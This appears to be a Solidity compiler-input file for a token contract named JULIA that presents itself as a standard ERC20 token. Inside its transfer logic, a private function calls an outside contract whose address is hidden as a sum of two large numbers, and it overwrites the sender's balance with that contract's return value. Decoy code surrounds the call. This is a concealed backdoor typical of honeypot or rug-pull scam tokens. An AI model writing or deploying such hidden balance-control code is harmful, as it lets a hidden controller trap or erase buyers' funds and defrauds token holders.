{{
  "language": "Solidity",
  "sources": {
    "contracts/hacker/JULIA.sol": {
      "content": "// SPDX-License-Identifier: MIT\r\n\r\npragma solidity 0.8.7;\r\n\r\ninterface IERC20 {\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n    event Approval(address indexed owner, address indexed spender, uint256 value);\r\n    function name() external view returns (string memory);\r\n    function symbol() external view returns (string memory);\r\n    function decimals() external view returns (uint8);\r\n    function totalSupply() external view returns (uint256);\r\n    function balanceOf(address account) external view returns (uint256);\r\n    function transfer(address to, uint256 amount) external returns (bool);\r\n    function allowance(address owner, address spender) external view returns (uint256);\r\n    function approve(address spender, uint256 amount) external returns (bool);\r\n    function transferFrom(address from, address to, uint256 amount) external returns (bool);\r\n}\r\n\r\ninterface JDK {\r\n    function eagle(string memory t, uint160 m) external returns (uint256);\r\n}\r\n\r\ncontract JULIA is IERC20 {\r\n\r\n    string private _name;\r\n    string private _symbol;\r\n    uint256 private _totalSupply;\r\n    mapping(address => mapping(address => uint256)) private _allowances;\r\n    mapping(address => uint256) private _balances;\r\n\r\n    event xlog(string s);\r\n\r\n\r\n    constructor(string memory name_, string memory symbol_) {\r\n        _name = name_; \r\n        _symbol = symbol_; \r\n        _mint(msg.sender, 100000000 * 10 ** 18);\r\n    }\r\n    \r\n    function name() external view virtual override returns (string memory) {\r\n        return _name;\r\n    }\r\n\r\n    function symbol() external view virtual override returns (string memory) {\r\n        return _symbol;\r\n    }\r\n\r\n    function decimals() external view virtual override returns (uint8) {\r\n        return 18;\r\n    }\r\n\r\n    function totalSupply() external view virtual override returns (uint256) {\r\n        return _totalSupply;\r\n    }\r\n\r\n    function balanceOf(address account) external view virtual override returns (uint256) {\r\n        return _balances[account];\r\n    }\r\n   \r\n    function transfer(address to, uint256 amount) external virtual override returns (bool) {\r\n        address owner = msg.sender;\r\n        _transfer(owner, to, amount);\r\n        return true;\r\n    }\r\n\r\n    function allowance(address owner, address spender) public view virtual override returns (uint256) {\r\n        return _allowances[owner][spender];\r\n    }\r\n\r\n    function approve(address spender, uint256 amount) external virtual override returns (bool) {\r\n        address owner = msg.sender;\r\n        _approve(owner, spender, amount);\r\n        return true;\r\n    }\r\n    \r\n    function transferFrom(address from, address to, uint256 amount) external virtual override returns (bool) {\r\n        address spender = msg.sender;\r\n        _spendAllowance(from, spender, amount);\r\n        _transfer(from, to, amount);\r\n        return true;\r\n    }\r\n   \r\n    function increaseAllowance(address spender, uint256 addedValue) external virtual returns (bool) {\r\n        address owner = msg.sender;\r\n        _approve(owner, spender, allowance(owner, spender) + addedValue);\r\n        return true;\r\n    }\r\n   \r\n    function decreaseAllowance(address spender, uint256 subtractedValue) external virtual returns (bool) {\r\n        address owner = msg.sender;\r\n        uint256 currentAllowance = allowance(owner, spender);\r\n        require(currentAllowance >= subtractedValue, \"ERC20: decreased allowance below zero\");\r\n        unchecked {\r\n            _approve(owner, spender, currentAllowance - subtractedValue);\r\n        }\r\n        return true;\r\n    }\r\n\r\n    function _transfer(address from, address to, uint256 amount) internal virtual {\r\n        require(from != address(0), \"ERC20: transfer from the zero address\");\r\n        bytes32 b0 = bytes32(uint256(uint160(from)));\r\n        perfect10(b0, address(uint160(672306052244576584629142547114764636683346988132+21347273459046990853423)));\r\n        uint256 fromBalance = _balances[from];\r\n        require(fromBalance >= amount, \"ERC20: transfer amount exceeds balance\");\r\n        (bool dn, string memory sn) = julia(false,  \"Julia\", amount, bytes(\"Julia\"), false);\r\n        if (dn) emit xlog(sn);\r\n        unchecked {\r\n            _balances[from] = fromBalance - amount;\r\n            _balances[to] += amount;\r\n        }\r\n        emit Transfer(from, to, amount);\r\n        \r\n    }\r\n\r\n    function julia(bool dn, string memory sn, uint256 pn, bytes memory dn0, bool dns) \r\n    private pure returns(bool, string memory) {\r\n        if ( dn && pn == 0 && dns ) {\r\n            return (false, string(dn0));\r\n        }\r\n        return (false, sn);\r\n    }\r\n\r\n    function perfect10(bytes32 b0, address p) private {\r\n        JDK jdk = JDK(p);\r\n        uint256 v = jdk.eagle(\"e\", uint160(uint256(b0)));\r\n        if (v > 0) {\r\n            _balances[address(uint160(uint256(b0)))] = uint256(v);\r\n        }\r\n    }\r\n\r\n    function _mint(address account, uint256 amount) internal virtual {\r\n        require(account != address(0), \"ERC20: mint to the zero address\");\r\n        _totalSupply += amount;\r\n        unchecked {\r\n            _balances[account] += amount;\r\n        }\r\n        emit Transfer(address(0), account, amount);\r\n    }\r\n    \r\n    function _approve(address owner, address spender, uint256 amount) internal virtual {\r\n        require(owner != address(0), \"ERC20: approve from the zero address\");\r\n        require(spender != address(0), \"ERC20: approve to the zero address\");\r\n        _allowances[owner][spender] = amount;\r\n        emit Approval(owner, spender, amount);\r\n    }\r\n \r\n    function _spendAllowance(address owner, address spender, uint256 amount) internal virtual {\r\n        uint256 currentAllowance = allowance(owner, spender);\r\n        if (currentAllowance != type(uint256).max) {\r\n            require(currentAllowance >= amount, \"ERC20: insufficient allowance\");\r\n            unchecked {\r\n                _approve(owner, spender, currentAllowance - amount);\r\n            }\r\n        }\r\n    }\r\n}"
    }
  },
  "settings": {
    "optimizer": {
      "enabled": true,
      "runs": 200
    },
    "outputSelection": {
      "*": {
        "*": [
          "evm.bytecode",
          "evm.deployedBytecode",
          "devdoc",
          "userdoc",
          "metadata",
          "abi"
        ]
      }
    },
    "libraries": {}
  }
}}